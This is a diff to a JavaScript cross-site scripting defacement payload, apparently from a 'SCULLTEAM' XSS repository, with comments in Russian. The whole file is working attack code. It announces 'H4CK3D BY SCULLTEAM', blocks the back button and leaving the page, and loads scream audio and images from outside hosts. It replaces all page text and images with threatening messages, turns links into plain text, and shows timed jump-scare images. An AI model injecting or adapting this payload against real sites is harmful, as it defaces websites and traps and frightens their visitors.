@@ -2,102 +2,97 @@ alert('H4CK3D BY SCULLTEAM');
 
 // Блокировка возврата назад
 window.history.pushState(null, null, window.location.href);
-window.onpopstate = () => window.history.pushState(null, null, window.location.href);
-window.addEventListener('beforeunload', e => {
+window.onpopstate = function () {
+    window.history.pushState(null, null, window.location.href);
+};
+window.addEventListener('beforeunload', function (e) {
     e.preventDefault();
     e.returnValue = '';
 });
 
-// Музыка
-setTimeout(() => {
-    const scaryMusic = document.createElement("audio");
+// Воспроизведение страшной музыки
+setTimeout(function () {
+    var scaryMusic = document.createElement("audio");
     scaryMusic.src = "https://scullteam.github.io/XSS/scary.mp3";
     scaryMusic.loop = true;
     scaryMusic.play();
 }, 1000);
 
-// Список изображений
-const imageList = [
+// Замена изображений на два поочерёдно
+var imageUrls = [
     "https://i.pinimg.com/736x/34/87/0b/34870b74942ca44221e4c78997498d9b.jpg",
     "https://i.ibb.co/3mW0gHbN/SCULLTEAM.png"
 ];
 
-// Замена всех изображений на случайное из списка
-document.querySelectorAll("img").forEach(img => {
-    const randomImg = imageList[Math.floor(Math.random() * imageList.length)];
-    img.src = randomImg;
-});
+function cycleImages() {
+    var images = document.getElementsByTagName("img");
+    var currentIndex = 0;
 
-// Замена текста
-const replacementText = "HEY, TURN AROUND, TURN AROUND";
-const replacementLinkText = "THERE IS NO ESCAPE";
-document.querySelectorAll("p, h1, h2, h3, h4, h5, h6").forEach(e => e.textContent = replacementText);
-document.querySelectorAll("a").forEach(e => e.textContent = replacementLinkText);
-
-// <a> → <p>
-document.querySelectorAll("a").forEach(link => {
-    const p = document.createElement("p");
-    p.textContent = link.textContent;
-    [...link.attributes].forEach(attr => p.setAttribute(attr.name, attr.value));
-    link.replaceWith(p);
-});
-
-// Скример
-function showScreamer() {
-    const img = document.createElement("img");
-    img.id = "fullScreenImg";
-    img.src = "https://wallpapers.com/images/high/scary-face-pictures-fvx05bim45ctjiwh.webp";
-    document.body.appendChild(img);
-
-    const scream = document.createElement("audio");
-    scream.src = "https://scullteam.github.io/XSS/krik.mp3";
-    document.body.appendChild(scream);
-    scream.play();
-
-    setTimeout(() => img.remove(), 800);
+    setInterval(function () {
+        for (var i = 0; i < images.length; i++) {
+            images[i].src = imageUrls[currentIndex];
+        }
+        currentIndex = (currentIndex + 1) % imageUrls.length;
+    }, 4000);
 }
 
-[6000,13000,25000,45000,75000,90000,105000,120000,135000].forEach(t => setTimeout(showScreamer, t));
+cycleImages();
 
-// Автопрокрутка
-setInterval(() => {
-    window.scrollBy(0, 100);
-    setTimeout(() => window.scrollBy(0, -100), 200);
-}, 500);
+// Замена текста
+var replacementText = "HEY, TURN AROUND, TURN AROUND, TURN AROUND";
+var replacementLinkText = "THERE IS NO ESCAPE";
 
-// Мигающий title
-let originalTitle = document.title;
-setInterval(() => {
-    document.title = document.title === originalTitle ? "!!! HACKED !!!" : originalTitle;
-}, 400);
-
-// Glitch-эффект
-document.querySelectorAll("h1, h2, h3, p, a, li").forEach(e => e.classList.add("glitch"));
-
-// Случайный вирусный текст
-setInterval(() => {
-    const messages = ["YOU SHOULDN'T BE HERE", "ERROR 666", "I'M WATCHING YOU", "ACCESS GRANTED TO HELL"];
-    const msg = document.createElement("h1");
-    msg.textContent = messages[Math.floor(Math.random() * messages.length)];
-    msg.style.position = "absolute";
-    msg.style.top = Math.random() * window.innerHeight + "px";
-    msg.style.left = Math.random() * window.innerWidth + "px";
-    msg.style.color = "red";
-    msg.style.fontSize = "30px";
-    msg.style.zIndex = 9999;
-    document.body.appendChild(msg);
-    setTimeout(() => msg.remove(), 3000);
-}, 2000);
-
-// Разрушение текста
-setInterval(() => {
-    document.querySelectorAll("p, h1, h2, a, li").forEach(el => {
-        el.textContent = el.textContent.split('').sort(() => 0.5 - Math.random()).join('');
-    });
-}, 5000);
-
-// Звук на каждый клик
-document.addEventListener("click", () => {
-    const clickAudio = new Audio("https://scullteam.github.io/XSS/click.mp3");
-    clickAudio.play();
+["p", "h1", "h2", "h3", "h4", "h5", "h6", "label"].forEach(tag => {
+    var elements = document.getElementsByTagName(tag);
+    for (var i = 0; i < elements.length; i++) {
+        elements[i].textContent = replacementText;
+    }
 });
+
+var links = document.getElementsByTagName("a");
+for (var i = 0; i < links.length; i++) {
+    links[i].textContent = replacementLinkText;
+}
+
+// Замена <a> на <p>
+var aTags = Array.from(document.getElementsByTagName("a"));
+aTags.forEach(function (link) {
+    var newP = document.createElement("p");
+    newP.textContent = link.textContent;
+    for (var i = 0; i < link.attributes.length; i++) {
+        var attr = link.attributes[i];
+        newP.setAttribute(attr.name, attr.value);
+    }
+    link.parentNode.replaceChild(newP, link);
+});
+
+// Скример на весь экран
+function showFullScreenImg() {
+    var fullScreenImg = document.createElement("img");
+    fullScreenImg.id = "fullScreenImg";
+    fullScreenImg.src = "https://i.pinimg.com/736x/34/87/0b/34870b74942ca44221e4c78997498d9b.jpg";
+
+    var audio = document.createElement("audio");
+    audio.src = "https://scullteam.github.io/XSS/krik.mp3";
+
+    document.body.appendChild(fullScreenImg);
+    document.body.appendChild(audio);
+
+    fullScreenImg.style.display = "block";
+    audio.play();
+
+    setTimeout(function () {
+        fullScreenImg.style.display = "none";
+    }, 800);
+}
+
+// Таймеры скримера
+setTimeout(showFullScreenImg, 6000);
+setTimeout(showFullScreenImg, 13000);
+setTimeout(showFullScreenImg, 25000);
+setTimeout(showFullScreenImg, 45000);
+setTimeout(showFullScreenImg, 75000);
+setTimeout(showFullScreenImg, 90000);
+setTimeout(showFullScreenImg, 105000);
+setTimeout(showFullScreenImg, 120000);
+setTimeout(showFullScreenImg, 135000);
